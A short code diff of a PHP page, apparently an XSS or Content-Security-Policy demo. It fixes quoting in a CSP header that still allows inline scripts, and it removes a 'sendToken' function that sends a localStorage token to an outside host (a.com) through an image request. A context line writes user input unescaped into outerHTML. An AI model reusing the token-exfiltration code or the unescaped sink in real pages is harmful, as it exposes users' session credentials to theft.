@@ -1,5 +1,5 @@
 <?php
-  header("Content-Security-Policy: default-src ‘self‘; script-src ‘self‘ ‘unsafe-inline‘ ");
+  header("Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'");
 ?>
 
 <!DOCTYPE html>
@@ -26,19 +26,6 @@
 			document.getElementById("rs").outerHTML = '<div id="rs">'+target.value+'</div>';
 		}
 
-		function sendToken(){
-			var img=new Image();
-			img.src='http://a.com?token='+ localStorage.getItem("token");
-
-			img.onerror=function(){
-			 alert('error');
-			}
-			
-			img.onload=function(){
-			 alert('success');
-			}
-			
-		}
 	</script>
 
 
